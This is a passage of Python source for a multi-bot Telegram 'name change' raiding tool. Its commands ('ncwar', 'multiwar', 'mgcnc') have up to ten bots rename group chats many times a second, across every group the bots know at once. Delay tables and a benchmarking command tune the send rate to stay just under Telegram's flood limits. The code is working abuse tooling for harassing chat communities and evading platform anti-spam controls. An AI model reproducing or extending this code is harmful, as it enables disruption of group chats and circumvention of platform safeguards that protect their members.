        elapsed = time.monotonic() - info["start_t"]
        m, s = divmod(int(elapsed), 60)
        nc_block = (
            f"  ▸ 𝗡𝗖:     ✅ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴\n"
            f"  ▸ 𝗘𝗻𝗴𝗶𝗻𝗲: {info['engine']}\n"
            f"  ▸ 𝗧𝗲𝘅𝘁:   {info['text']}\n"
            f"  ▸ 𝗧𝗶𝗺𝗲:   {m}𝗺 {s}𝘀\n"
        )
    elif nc:
        nc_block = "  ▸ 𝗡𝗖:     ✅ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴\n"
    else:
        nc_block = "  ▸ 𝗡𝗖:     ❌ 𝗦𝘁𝗼𝗽𝗽𝗲𝗱\n"

    tr  = cid in targetreply_chats
    ts  = cid in targetslide_chats
    pfp = pfploop_active.get(cid, False)

    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  📊 𝑺𝑻𝑨𝑻𝑼𝑺\n"
        f"  ─────────────────────────────\n"
        f"{nc_block}"
        f"  ▸ 𝗕𝗼𝘁𝘀:   {len(bots)}/10 𝗮𝗰𝘁𝗶𝘃𝗲\n"
        f"  ▸ 𝗗𝗲𝗹𝗮𝘆:  {gap:.2f}𝘴\n"
        f"  ▸ 𝗧𝗥𝗣𝗟𝗬: {'✅' if tr else '❌'}\n"
        f"  ▸ 𝗧𝗦𝗟𝗜𝗗𝗘: {'✅' if ts else '❌'}\n"
        f"  ▸ 𝗣𝗙𝗣:   {'✅ 𝗟𝗼𝗼𝗽' if pfp else '❌'}\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_uptime(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    elapsed = time.monotonic() - BOT_START_TIME
    h, rem  = divmod(int(elapsed), 3600)
    m, s    = divmod(rem, 60)
    bots    = _bots()
    nc      = tc.running(msg.chat_id, "nc")
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⏱ 𝑼𝑷𝑻𝑰𝑴𝑬\n"
        f"  ─────────────────────────────\n"
        f"  ▸ {h}𝗵 {m}𝗺 {s}𝘀\n"
        f"  ▸ 𝗕𝗼𝘁𝘀: {len(bots)}/10\n"
        f"  ▸ 𝗡𝗖:   {'✅' if nc else '❌'}\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_ping(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    t0   = time.monotonic()
    sent = await msg.reply_text("🏓")
    ms   = int((time.monotonic() - t0) * 1000)
    qual = "🟢 𝗙𝗮𝘀𝘁" if ms < 300 else ("🟡 𝗢𝗸" if ms < 700 else "🔴 𝗦𝗹𝗼𝘄")
    await sent.edit_text(
        f"╔══════════════════════════════╗\n"
        f"  🏓 𝑷𝑰𝑵𝑮\n"
        f"  ─────────────────────────────\n"
        f"  ▸ 𝗥𝗧𝗧:  {ms}𝗺𝘀  {qual}\n"
        f"  ▸ 𝗕𝗼𝘁𝘀: {len(_bots())}/10\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_setdelay(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global _nc_send_gap
    msg = update.message or update.edited_message
    if not msg:
        return
    args = _get_args(ctx)
    if not args:
        cur = f"{_nc_send_gap:.2f}𝘴" if _nc_send_gap is not None else "𝐝𝐞𝐟𝐚𝐮𝐥𝐭"
        await _reply(msg,
            "╔══════════════════════════╗\n"
            "  ⏱ 𝐍𝐂 𝐃𝐄𝐋𝐀𝐘 𝐒𝐓𝐀𝐓𝐔𝐒\n"
            f"  𝘊𝘶𝘳𝘳𝘦𝘯𝘵: {cur}\n"
            "  𝘜𝘴𝘦: -setdelay <sec>\n"
            "  𝘙𝘦𝘴𝘦𝘵: -setdelay reset\n"
            "╚══════════════════════════╝"
        )
        return
    if args[0].lower() in ("reset", "default", "off"):
        _nc_send_gap = None
        await _reply(msg,
            "╔══════════════════════════╗\n"
            "  ✅ 𝐍𝐂 𝐃𝐄𝐋𝐀𝐘 𝐑𝐄𝐒𝐄𝐓\n"
            "╚══════════════════════════╝"
        )
        return
    try:
        val = float(args[0])
        if val < 0.05 or val > 10.0:
            await _reply(msg, "⚠️ 𝐃𝐞𝐥𝐚𝐲 𝐦𝐮𝐬𝐭 𝐛𝐞 0.05 – 10.0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬")
            return
        _nc_send_gap = val
        await _reply(msg,
            "╔══════════════════════════╗\n"
            "  ✅ 𝐍𝐂 𝐃𝐄𝐋𝐀𝐘 𝐒𝐄𝐓\n"
            f"  ⏱ 𝘎𝘢𝘱: {val}𝘴\n"
            "  𝘙𝘦𝘴𝘵𝘢𝘳𝘵 𝘺𝘰𝘶𝘳 𝘕𝘊 𝘵𝘰 𝘢𝘱𝘱𝘭𝘺\n"
            "╚══════════════════════════╝"
        )
    except ValueError:
        await _reply(msg, "𝐔𝐬𝐞: -setdelay <seconds>")

@_guard
async def cmd_delay(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """
    -delay <ncname> <seconds|reset>
    Set per-NC step for any NC: nc3, sharingan, uchiha, chidori, etc.
    Safe range: 0.25–0.40s → 3-4 changes/sec → no flood, looks fast.
    """
    msg = update.message or update.edited_message
    if not msg:
        return
    args = _get_args(ctx)
    if len(args) < 2:
        lines = [
            "╔══════════════════════════════════╗",
            "  ⏱ 𝐃𝐄𝐋𝐀𝐘 𝐒𝐄𝐓𝐓𝐄𝐑",
            "  𝐔𝐬𝐞: -delay <name> <sec|reset>",
            "  𝐄𝐱:  -delay nc3 0.30",
            "  𝐄𝐱:  -delay sharingan 0.28",
            "  𝐄𝐱:  -delay uchiha reset",
            "  ─────────────────────────────────",
            "  𝐑𝐞𝐜𝐨𝐦𝐦𝐞𝐧𝐝𝐞𝐝: 0.25–0.40𝐬",
            "  (10 bots × 0.30s = 3.3/sec ✅)",
            "  < 0.25s = flood ⚠️",
            "╚══════════════════════════════════╝",
        ]
        await _reply(msg, "\n".join(lines))
        return
    nc_key = args[0].lower()
    val_str = args[1].lower()
    if val_str in ("reset", "default", "off"):
        _nc_gaps[nc_key] = None
        cur = _NC_DELAY_DEFAULTS.get(nc_key, "N/A")
        await _reply(msg,
            f"╔══════════════════════════╗\n"
            f"  ✅ {nc_key.upper()} 𝐫𝐞𝐬𝐞𝐭 → {cur}𝘴\n"
            f"  𝘙𝘦𝘴𝘵𝘢𝘳𝘵 𝘵𝘩𝘦 𝘕𝘊 𝘵𝘰 𝘢𝘱𝘱𝘭𝘺\n"
            f"╚══════════════════════════╝"
        )
        return
    try:
        val = float(val_str)
        if val < 0.05 or val > 10.0:
            await _reply(msg, "⚠️ 𝐑𝐚𝐧𝐠𝐞: 0.05 – 10.0𝐬 | 𝐁𝐞𝐬𝐭: 0.25–0.40𝐬")
            return
        _nc_gaps[nc_key] = val
        # Friendly flood-risk warning
        rate = 1.0 / val  # with 1 bot; with 10 bots effective = rate
        warn = " ⚠️ 𝐅𝐋𝐎𝐎𝐃 𝐑𝐈𝐒𝐊!" if val < 0.25 else " ✅ 𝐒𝐚𝐟𝐞"
        await _reply(msg,
            f"╔══════════════════════════════╗\n"
            f"  ✅ {nc_key.upper()} 𝐃𝐄𝐋𝐀𝐘 𝐒𝐄𝐓\n"
            f"  ⏱ 𝘚𝘵𝘦𝘱: {val}𝘴  𝘙𝘢𝘵𝘦: {rate:.1f}/𝘴{warn}\n"
            f"  𝘙𝘦𝘴𝘵𝘢𝘳𝘵 𝘵𝘩𝘦 𝘕𝘊 𝘵𝘰 𝘢𝘱𝘱𝘭𝘺\n"
            f"╚══════════════════════════════╝"
        )
    except ValueError:
        await _reply(msg, "𝐔𝐬𝐞: -delay <ncname> <seconds>")

# ── Per-NC delay system ─────────────────────────────────────────────────────
_NC_DELAY_DEFAULTS: Dict[str, float] = {
    "blaze": 0.35, "surge": 0.25, "god": 0.18,
    "stagger": 0.15, "silk": 0.18, "trio": 0.10, "chud": 0.20,
    "mgcnc": 0.09,
}
# nc1-nc115 delay defaults — 0.28s: PHOENIX engine single-ticker → 3.57 sends/sec, zero flood
# Each NC gets a tiny variation (0.28-0.30) for visual distinction, all safely within Telegram limits
_NC_DELAY_DEFAULTS.update({
    f"nc{i}": round(0.28 + ((i - 1) % 5) * 0.005, 3) for i in range(1, 116)
})
# nc3 override — 0.30s: cuneiform content is short, slightly slower looks cleaner
_NC_DELAY_DEFAULTS["nc3"] = 0.30
# nc101-nc115 slight variations for uniqueness feel
_NC_DELAY_DEFAULTS.update({
    "nc101": 0.28, "nc102": 0.28, "nc103": 0.29, "nc104": 0.28, "nc105": 0.29,
    "nc106": 0.28, "nc107": 0.28, "nc108": 0.29, "nc109": 0.28, "nc110": 0.29,
    "nc111": 0.28, "nc112": 0.28, "nc113": 0.29, "nc114": 0.28, "nc115": 0.29,
})

def _make_ncdelay_cmd(nc: str):
    dflt = _NC_DELAY_DEFAULTS.get(nc, 0.20)
    @_guard
    async def _cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        msg = update.message or update.edited_message
        if not msg:
            return
        args = _get_args(ctx)
        if not args:
            v = _nc_gaps.get(nc)
            cur = f"{v:.2f}𝘴" if v is not None else f"𝐝𝐞𝐟𝐚𝐮𝐥𝐭 ({dflt}𝘴)"
            await _reply(msg,
                f"╔══════════════════════════╗\n"
                f"  ⏱ {nc.upper()} 𝐃𝐄𝐋𝐀𝐘: {cur}\n"
                f"  𝘜𝘴𝘦: -{nc}delay <sec|reset>\n"
                f"╚══════════════════════════╝"
            )
            return
        if args[0].lower() in ("reset", "default", "off"):
            _nc_gaps[nc] = None
            await _reply(msg,
                f"╔══════════════════════════╗\n"
                f"  ✅ {nc.upper()} 𝐝𝐞𝐥𝐚𝐲 𝐫𝐞𝐬𝐞𝐭 → {dflt}𝘴\n"
                f"╚══════════════════════════╝"
            )
            return
        try:
            val = float(args[0])
            if val < 0.05 or val > 10.0:
                await _reply(msg, "⚠️ 0.05 – 10.0𝘴 ke beech hona chahiye")
                return
            _nc_gaps[nc] = val
            await _reply(msg,
                f"╔══════════════════════════╗\n"
                f"  ✅ {nc.upper()} 𝐃𝐄𝐋𝐀𝐘 𝐒𝐄𝐓 → {val}𝘴\n"
                f"  𝘙𝘦𝘴𝘵𝘢𝘳𝘵 𝘕𝘊 𝘵𝘰 𝘢𝘱𝘱𝘭𝘺\n"
                f"╚══════════════════════════╝"
            )
        except ValueError:
            await _reply(msg, f"𝐔𝐬𝐞: -{nc}delay <seconds>")
    _cmd.__name__ = f"cmd_{nc}delay"
    return _cmd

@_guard
async def cmd_resetdelay(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global _nc_send_gap
    msg = update.message or update.edited_message
    if not msg:
        return
    _nc_send_gap = None
    _nc_gaps.clear()
    await _reply(msg,
        "╔══════════════════════════════╗\n"
        "  ✅ 𝐀𝐋𝐋 𝐃𝐄𝐋𝐀𝐘𝐒 𝐑𝐄𝐒𝐄𝐓\n"
        "  𝘎𝘭𝘰𝘣𝘢𝘭 + 𝘱𝘦𝘳-𝘕𝘊 𝘴𝘣 𝘥𝘦𝘧𝘢𝘶𝘭𝘵\n"
        "╚══════════════════════════════╝"
    )

@_guard
async def cmd_delays(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    gval = f"{_nc_send_gap:.2f}𝘴" if _nc_send_gap is not None else "𝐝𝐞𝐟𝐚𝐮𝐥𝐭"
    rows = []
    for nc, dflt in _NC_DELAY_DEFAULTS.items():
        v = _nc_gaps.get(nc)
        val_s = f"{v:.2f}𝘴" if v is not None else f"dflt({dflt}𝘴)"
        rows.append(f"  • -{nc}delay  {val_s}")
    await _reply(msg,
        "╔══════════════════════════════╗\n"
        "  ⏱ 𝑵𝑪 𝑫𝑬𝑳𝑨𝒀 𝑺𝑻𝑨𝑻𝑼𝑺\n"
        f"  🌐 𝘎𝘭𝘰𝘣𝘢𝘭 (-setdelay): {gval}\n"
        + "\n".join(rows) + "\n"
        "╚══════════════════════════════╝"
    )

_NC_DELAY_CMDS: Dict[str, Any] = {
    f"{nc}delay": _make_ncdelay_cmd(nc) for nc in _NC_DELAY_DEFAULTS
}
# ─────────────────────────────────────────────────────────────────────────────

@_guard
async def cmd_phantom(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if msg:
        await _reply(msg,
            "╔══════════════════════╗\n"
            "  ⚡ 𝑩𝑳𝑨𝒁𝑬 𝑬𝑵𝑮𝑰𝑵𝑬\n"
            "  𝘈𝘭𝘭 𝘣𝘰𝘵𝘴 𝘧𝘪𝘳𝘦 𝘢𝘵 𝘰𝘯𝘤𝘦\n"
            "  𝘡𝘦𝘳𝘰 𝘫𝘪𝘵𝘵𝘦𝘳 | 𝘐𝘯𝘴𝘵𝘢𝘯𝘵 𝘴𝘵𝘰𝘱\n"
            "╚══════════════════════╝"
        )

@_guard
async def cmd_testament(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await cmd_phantom(update, ctx)

@_guard
async def cmd_shadow(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await cmd_phantom(update, ctx)

@_guard
async def cmd_ncdel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx) or "EVA GOD"
    ncdel_chats.add(cid)

    async def _run(stop_ev):
        await _run_engine(cid, _bots(), stop_ev, _pure_nc_factory(txt))

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        "╔══════════════════════╗\n"
        "  ⚔️ 𝐍𝐂𝐃𝐄𝐋 𝐀𝐂𝐓𝐈𝐕𝐄\n"
        "  𝘕𝘊 + 𝘥𝘦𝘭𝘦𝘵𝘦 𝘮𝘰𝘥𝘦\n"
        "╚══════════════════════╝"
    )

@_guard
async def cmd_ncwar(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx) or "EVA GOD WAR"
    ncwar_targets[cid] = txt
    await _start_nc(msg, cid, _pure_nc_factory(txt), f"⚔️ WAR: {txt}")

@_guard
async def cmd_stopncwar(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    ncwar_targets.pop(cid, None)
    await tc.stop(cid, "nc")
    await _reply(msg, "⛔ 𝐍𝐂 𝐖𝐀𝐑 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

async def _start_mgcnc(msg, factory, label: str):
    global _mgcnc_stop, _mgcnc_task, _mgcnc_targets
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    targets = list(known_chats)
    if not targets:
        await _reply(msg, "⚠️ 𝐍𝐨 𝐤𝐧𝐨𝐰𝐧 𝐠𝐫𝐨𝐮𝐩𝐬. 𝐅𝐢𝐫𝐬𝐭 𝐮𝐬𝐞 𝐛𝐨𝐭 𝐢𝐧 𝐚 𝐠𝐫𝐨𝐮𝐩.")
        return

    # Stop any running MGC NC cleanly before starting a new one
    if _mgcnc_stop and not _mgcnc_stop.is_set():
        _mgcnc_stop.set()
    if _mgcnc_task and not _mgcnc_task.done():
        _mgcnc_task.cancel()
        try:
            await asyncio.wait_for(asyncio.shield(_mgcnc_task), timeout=2.0)
        except Exception:
            pass

    _mgcnc_targets[:] = targets
    stop_ev = asyncio.Event()
    _mgcnc_stop = stop_ev                       # direct global assignment

    snapshot_bots    = list(bots)
    snapshot_targets = list(targets)
    snapshot_factory = factory

    async def _run():
        try:
            await _mgcnc_engine(snapshot_targets, snapshot_bots, stop_ev, snapshot_factory)
        except asyncio.CancelledError:
            pass

    _mgcnc_task = asyncio.create_task(_run())

    gap = _gap("mgcnc", 0.09)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🌐 𝐌𝐔𝐋𝐓𝐈-𝐆𝐂 𝐍𝐂 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  📛 {label}\n"
        f"  🎯 𝘎𝘊𝘴: {len(targets)}  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  ⚙️  𝘎𝘈𝘗: {gap:.2f}𝘴 · 𝘙𝘰𝘶𝘯𝘥-𝘙𝘰𝘣𝘪𝘯\n"
        f"  -stopmgcnc 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_mgcnc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg,
            "╔══════════════════════════════╗\n"
            "  🌐 𝐌𝐔𝐋𝐓𝐈-𝐆𝐂 𝐍𝐂 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒\n"
            "  -mgcnc <t>    𝘉𝘢𝘴𝘪𝘤 𝘕𝘊\n"
            "  -mgcchud <t>  💥 𝘊𝘩𝘶𝘥\n"
            "  -mgcbold <t>  𝘉𝘰𝘭𝘥\n"
            "  -mgcfire <t>  🔥 𝘍𝘪𝘳𝘦\n"
            "  -mgcwar <t>   ⚔️ 𝘞𝘢𝘳\n"
            "  -mgcsurge <t> ⚡ 𝘚𝘶𝘳𝘨𝘦\n"
            "  -mgccustom <n> <t>\n"
            "  -stopmgcnc    𝘚𝘵𝘰𝘱\n"
            "  -mgcstatus    𝘚𝘵𝘢𝘵𝘶𝘴\n"
            "╚══════════════════════════════╝"
        )
        return
    await _start_mgcnc(msg, _pure_nc_factory(txt), txt)

@_guard
async def cmd_mgcchud(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -mgcchud <text>")
        return
    await _start_mgcnc(msg, _chud_nc_factory(txt), f"💥 CHUD {txt}")

@_guard
async def cmd_mgcbold(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -mgcbold <text>")
        return
    await _start_mgcnc(msg, _font_factory(txt, "bold"), f"𝐁𝐎𝐋𝐃 {txt}")

@_guard
async def cmd_mgcfire(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -mgcfire <text>")
        return
    await _start_mgcnc(msg, _mgc_fire_factory(txt), f"🔥 {txt}")

@_guard
async def cmd_mgcwar(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -mgcwar <text>")
        return
    await _start_mgcnc(msg, _mgc_war_factory(txt), f"⚔️ {txt}")

@_guard
async def cmd_mgcsurge(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -mgcsurge <text>")
        return
    await _start_mgcnc(msg, _mgc_surge_factory(txt), f"⚡ SURGE {txt}")

@_guard
async def cmd_mgccustom(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    args = _get_args(ctx)
    if len(args) < 2:
        await _reply(msg, "𝐔𝐬𝐞: -mgccustom <template_name> <text>")
        return
    name = args[0]
    txt  = " ".join(args[1:])
    if name not in custom_templates:
        await _reply(msg, f"⚠️ Template '{name}' not found. Use -templates")
        return
    tmpl    = custom_templates[name]
    factory = _custom_template_factory(tmpl, txt)
    await _start_mgcnc(msg, factory, f"🎨 {name}: {txt}")

@_guard
async def cmd_stopmgcnc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global _mgcnc_stop, _mgcnc_task, _mgcnc_targets
    msg = update.message or update.edited_message
    if not msg:
        return

    running = _mgcnc_task and not _mgcnc_task.done()

    # Signal stop — engine's stop_event.wait() unblocks → finalizer runs
    if _mgcnc_stop and not _mgcnc_stop.is_set():
        _mgcnc_stop.set()

    # Backup: cancel the task too so workers can't stall cleanup
    if _mgcnc_task and not _mgcnc_task.done():
        _mgcnc_task.cancel()
        try:
            await asyncio.wait_for(asyncio.shield(_mgcnc_task), timeout=2.0)
        except Exception:
            pass

    _mgcnc_targets.clear()
    _mgcnc_stop = None
    _mgcnc_task = None

    if running:
        await _reply(msg,
            "╔══════════════════════╗\n"
            "  ⛔ 𝐌𝐔𝐋𝐓𝐈-𝐆𝐂 𝐍𝐂 𝐒𝐓𝐎𝐏𝐏𝐄𝐃\n"
            "╚══════════════════════╝"
        )
    else:
        await _reply(msg, "⚡ 𝐍𝐨 𝐚𝐜𝐭𝐢𝐯𝐞 𝐌𝐮𝐥𝐭𝐢-𝐆𝐂 𝐍𝐂.")

@_guard
async def cmd_mgcstatus(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    running = bool(_mgcnc_task and not _mgcnc_task.done())
    bots    = _bots()
    status  = "🟢 𝐑𝐔𝐍𝐍𝐈𝐍𝐆" if running else "🔴 𝐒𝐓𝐎𝐏𝐏𝐄𝐃"
    gc_list = "\n".join(f"  • {c}" for c in _mgcnc_targets) if _mgcnc_targets else "  𝘕𝘰𝘯𝘦"
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🌐 𝐌𝐔𝐋𝐓𝐈-𝐆𝐂 𝐒𝐓𝐀𝐓𝐔𝐒\n"
        f"  {status}\n"
        f"  🎯 𝘎𝘊𝘴: {len(_mgcnc_targets)}  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"{gc_list}\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_multiwar(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Multi-GC NC via MGC engine — round-robin, no per-GC spam."""
    msg = update.message or update.edited_message
    if not msg:
        return
    known_chats.add(msg.chat_id)
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg,
            "╔══════════════════════════════╗\n"
            "  🎯 𝐌𝐔𝐋𝐓𝐈𝐖𝐀𝐑\n"
            "  𝘜𝘴𝘦: -multiwar <text>\n"
            "  𝘚𝘵𝘰𝘱: -stopmultiwar\n"
            "╚══════════════════════════════╝"
        )
        return
    # Reuse MGC engine — distributes bots across GCs via round-robin
    # No more per-GC separate blaze engines (was causing flood/spam)
    await _start_mgcnc(msg, _pure_nc_factory(txt), f"⚔️ MULTIWAR {txt}")

@_guard
async def cmd_stopmultiwar(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Alias: stops the shared MGC engine started by multiwar."""
    msg = update.message or update.edited_message
    if not msg:
        return
    _multiwar_active.clear()
    await cmd_stopmgcnc(update, ctx)

@_guard
async def cmd_speedtest(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬!")
        return
    await _reply(msg,
        "╔══════════════════════════════╗\n"
        "  ⚡ 𝑺𝑷𝑬𝑬𝑫𝑻𝑬𝑺𝑻 𝑺𝑻𝑨𝑹𝑻𝑬𝑫\n"
        "  𝘙𝘶𝘯𝘯𝘪𝘯𝘨 10𝘴...\n"
        "╚══════════════════════════════╝"
    )
    DURATION = 10.0
    count    = [0]
    floods   = [0]
    done_ev  = asyncio.Event()
    factory  = _lean_nc_factory("SpeedTest")

    async def _tw(bot):
        while not done_ev.is_set():
            try:
                await bot.set_chat_title(cid, factory()[:255])
                count[0] += 1
            except RetryAfter:
                floods[0] += 1
                try:
                    await asyncio.wait_for(done_ev.wait(), timeout=0.5)
                except asyncio.TimeoutError:
                    pass
            except Exception:
                try:
                    await asyncio.wait_for(done_ev.wait(), timeout=0.1)
                except asyncio.TimeoutError:
                    pass

    workers = [asyncio.create_task(_tw(b)) for b in bots]
    try:
        await asyncio.wait_for(done_ev.wait(), timeout=DURATION)
    except asyncio.TimeoutError:
        pass
    done_ev.set()
    await asyncio.gather(*workers, return_exceptions=True)

    rate    = count[0] / DURATION
    verdict = ("🟢 𝗘𝘅𝗰𝗲𝗹𝗹𝗲𝗻𝘁" if rate >= 5 else
               "🟡 𝗚𝗼𝗼𝗱" if rate >= 3 else "🔴 𝗦𝗹𝗼𝘄")
    await msg.reply_text(
        f"╔══════════════════════════════╗\n"
        f"  ⚡ 𝑺𝑷𝑬𝑬𝑫𝑻𝑬𝑺𝑻 𝑹𝑬𝑺𝑼𝑳𝑻𝑺\n"
        f"  ─────────────────────────────\n"
        f"  ▸ 𝗖𝗵𝗮𝗻𝗴𝗲𝘀:  {count[0]} 𝗶𝗻 10𝘀\n"
        f"  ▸ 𝗦𝗽𝗲𝗲𝗱:    {rate:.1f}/𝘀𝗲𝗰  {verdict}\n"
        f"  ▸ 𝗙𝗹𝗼𝗼𝗱𝘀:   {floods[0]}\n"
        f"  ▸ 𝗕𝗼𝘁𝘀:     {len(bots)}/10\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_ncbench(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """
    -ncbench
    Tests delay values 0.25→0.35s (6 values × 4s each) and reports which
    delay gives the most sends without triggering flood.  Takes ~30s total.
    """
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return

    DELAYS   = [round(0.25 + i * 0.02, 2) for i in range(6)]   # 0.25 0.27 0.29 0.31 0.33 0.35
    DURATION = 4.0   # seconds per delay value — total ~30s
    factory  = _lean_nc_factory("BENCH")

    await _reply(msg,
        "╔════════════════════════════════╗\n"
        "  🔬 𝑵𝑪𝑩𝑬𝑵𝑪𝑯 𝑺𝑻𝑨𝑹𝑻𝑬𝑫\n"
        f"  𝘛𝘦𝘴𝘵𝘪𝘯𝘨: {', '.join(str(d) for d in DELAYS)}𝘴\n"
        f"  𝘌𝘢𝘤𝘩 𝘥𝘦𝘭𝘢𝘺: {DURATION:.0f}𝘴 · 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  𝘛𝘰𝘵𝘢𝘭: ~{int(len(DELAYS) * (DURATION + 1))}𝘴\n"
        "╚════════════════════════════════╝"
    )

    results = []   # (delay, sends, floods)

    for delay in DELAYS:
        count         = [0]
        floods        = [0]
        ev            = asyncio.Event()
        flooded_until = [0.0] * len(bots)
        cursor        = [0]

        async def _bench_run(_ev=ev, _count=count, _floods=floods, _delay=delay,
                             _fu=flooded_until, _cur=cursor):
            """Single-ticker (phoenix-style) bench for accurate send/flood counting."""
            N         = len(bots)
            next_tick = time.monotonic()
            while not _ev.is_set():
                wait = next_tick - time.monotonic()
                if wait > 0.001:
                    try:
                        await asyncio.wait_for(_ev.wait(), timeout=wait)
                        return
                    except asyncio.TimeoutError:
                        pass
                if _ev.is_set():
                    return
                now    = time.monotonic()
                chosen = -1
                for _ in range(N):
                    i = _cur[0] % N
                    _cur[0] += 1
                    if _fu[i] <= now:
                        chosen = i
                        break
                if chosen == -1:
                    soonest = min(_fu) - now
                    if await _wait_ev(_ev, max(soonest, 0.05)):
                        return
                    continue
                try:
                    await bots[chosen].set_chat_title(cid, factory()[:255])
                    _count[0] += 1
                    next_tick += _delay
                except RetryAfter as e:
                    _floods[0] += 1
                    _fu[chosen] = time.monotonic() + min(float(e.retry_after) + 0.1, 2.5)
                    next_tick += _delay
                except Exception:
                    next_tick += _delay

        task = asyncio.create_task(_bench_run())
        try:
            await asyncio.wait_for(asyncio.shield(task), timeout=DURATION)
        except asyncio.TimeoutError:
            pass
        ev.set()
        try:
            await asyncio.wait_for(task, timeout=2.0)
        except Exception:
            pass

        results.append((delay, count[0], floods[0]))
        # 1s cooldown between tests so flood limits reset
        await asyncio.sleep(1.0)

    # Best = most sends with zero floods; fallback = fewest floods
    no_flood = [(d, s, f) for d, s, f in results if f == 0]
    if no_flood:
        best_d, best_s, best_f = max(no_flood, key=lambda x: x[1])
    else:
        best_d, best_s, best_f = min(results, key=lambda x: x[2])

    lines = [
        "╔══════════════════════════════════╗",
        "  🔬 𝑵𝑪𝑩𝑬𝑵𝑪𝑯 𝑹𝑬𝑺𝑼𝑳𝑻𝑺",
        "  ──────────────────────────────────",
    ]
    for d, s, f in results:
        star = " ⭐𝐁𝐄𝐒𝐓" if d == best_d else ""
        icon = "✅" if f == 0 else ("⚠️" if f <= 2 else "🔴")
        rate = s / DURATION
        lines.append(f"  {icon} {d:.2f}𝘴 → {s} 𝘴𝘦𝘯𝘥𝘴 ({rate:.1f}/𝘴) 𝘧𝘭𝘰𝘰𝘥:{f}{star}")
    lines += [
        "  ──────────────────────────────────",
        f"  🏆 𝐁𝐄𝐒𝐓 𝐃𝐄𝐋𝐀𝐘: {best_d:.2f}𝘴",
